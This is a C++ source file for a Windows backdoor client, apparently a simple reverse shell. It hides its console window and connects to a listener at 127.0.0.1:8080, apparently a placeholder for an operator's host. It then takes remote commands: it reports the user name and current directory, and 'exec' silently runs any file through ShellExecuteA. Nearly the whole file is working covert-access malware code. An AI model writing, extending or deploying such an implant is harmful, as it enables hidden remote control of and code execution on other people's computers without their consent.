#include <winsock2.h>
#include <windows.h>
#include <Ws2tcpip.h>

#include <stdio.h>
#include <iostream>

#pragma comment(lib, "Ws2_32.lib")
#define DEFAULT_BUFLEN 1024
#define DEBUG_MODE 0

void StealthConsole()
{
    HWND stealth;
    AllocConsole();
    stealth = FindWindowA("ConsoleWindowClass", NULL);
    ShowWindow(stealth, DEBUG_MODE);
}

void whoami(char* buffer)
{
    DWORD size = 257;
    GetUserNameA(buffer, &size);
}

void pwd(char* returnval)
{
    GetCurrentDirectoryA(MAX_PATH, returnval);
}

void exec(char* returnVal, char* fileExec)
{
    if (32 >= (int)(ShellExecuteA(NULL, "open", fileExec, NULL, NULL, SW_HIDE)))
    {
        //strcat_s(*returnVal, "[x] Error executing command..\n");
    }
    else
    {
        //strcat_s(returnVal, "\n");
    }
}

void* get_in_addr(struct sockaddr* sa)
{
    if (sa->sa_family == AF_INET) {
        return &(((struct sockaddr_in*)sa)->sin_addr);
    }

    return &(((struct sockaddr_in6*)sa)->sin6_addr);
}

int main()
{      
    StealthConsole();

    WSADATA wsData;

    WSAStartup(MAKEWORD(2, 2), &wsData); // check compatibility;
    SOCKET tcpSocket = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP); // create a TCP socket

    struct addrinfo hints;
    struct addrinfo* servinfo;  // will point to the results
    int status;

    memset(&hints, 0, sizeof hints);
    hints.ai_family = AF_INET;
    hints.ai_socktype = SOCK_STREAM; // TCP stream sockets

    if ((status = getaddrinfo("127.0.0.1", "8080", &hints, &servinfo)) != 0) {
        fprintf(stderr, "getaddrinfo error: %d\n", status);
        exit(1);
    }

    //sockaddr_in addr;
    //addr.sin_family = AF_INET;
    //addr.sin_port = htons(8080);
    ////inet_addr("127.0.0.1");    
    ///*if ((inet_pton(addr.sin_family, "127.0.0.1", &addr.sin_addr) < 0))
    //{
    //    std::cout << "wow";
    //}*/

    if (connect(tcpSocket, servinfo->ai_addr, servinfo->ai_addrlen) == SOCKET_ERROR)
    {
        closesocket(tcpSocket);
        WSACleanup();
        std::cout << "[+] Connection Failed!" << std::endl;
        exit(0);
    }
    else
    {
        std::cout << "[+] Connected. Press <Enter> to disconnect..." << std::endl;

        char recvCommand[DEFAULT_BUFLEN] = "";

        while (true)
        {
            int res = recv(tcpSocket, recvCommand, DEFAULT_BUFLEN, 0);
            /*std::cout << "Command received: " << recvCommand;
            std::cout << "Length of Command received: " << res << std::endl;*/
                              
            if ((strcmp(recvCommand, "exit") == 0))
            {
                std::cout << "Parsed Command: exit" << std::endl;
                std::cout << "Quitting...";
                break;
            }
            else if ((strcmp(recvCommand, "whoami") == 0))
            {
                std::cout << "Parsed Command: whoami" << std::endl;
                char buffer[257] = "";
                whoami(buffer);
                strcat_s(buffer, "\n");
                send(tcpSocket, buffer, sizeof(buffer), 0);
                memset(buffer, 0, sizeof(buffer));
            }
            else if ((strcmp(recvCommand, "pwd") == 0))
            {
                std::cout << "Parsed Command: pwd" << std::endl;
                char buffer[MAX_PATH] = "";                
                pwd(buffer);
                strcat_s(buffer, "\n");
                send(tcpSocket, buffer, sizeof(buffer), 0);
                memset(buffer, 0, sizeof(buffer));
            }
            //else if((strcmp(recvCommand, "exec")))
            else 
            {
                char splitval[DEFAULT_BUFLEN] = "";   //temporary variable
                for (int i = 0; i < (*(&recvCommand + 1) - recvCommand); ++i)
                {
                    if (recvCommand[i] == *" ")    //recvCommand[i] is a pointer here and can only be compared with a integer, this *" " is the address to the `space`
                        break;
                    else
                    {
                        splitval[i] = recvCommand[i];  //store the split part 1 in variable splitval
                    }
                }
                if ((strcmp(splitval, "exec") == 0)) {
                    char execCommand[DEFAULT_BUFLEN] = "";
                    int j = 0;
                    for (int i = 5; i < (*(&recvCommand + 1) - recvCommand); ++i)
                    {
                        execCommand[j] = recvCommand[i]; //store the secondary variable in the execCommand variable
                        ++j;
                    }
                    char buffer[257] = "";
                    exec(buffer, execCommand);
                    //strcat(buffer, "\n");
                    send(tcpSocket, buffer, strlen(buffer) + 1, 0);
                    memset(buffer, 0, sizeof(buffer));
                    memset(recvCommand, 0, sizeof(recvCommand));
                }
                else
                {
                    std::cout << "Could not parse command!" << std::endl;
                    send(tcpSocket, "Uknown command", sizeof("Unknown command"), 0);
                }               
            }
            memset(recvCommand, 0, sizeof(recvCommand)); // reset recvCommand 
        }             
    }



    closesocket(tcpSocket);
    WSACleanup();
    exit(0);
}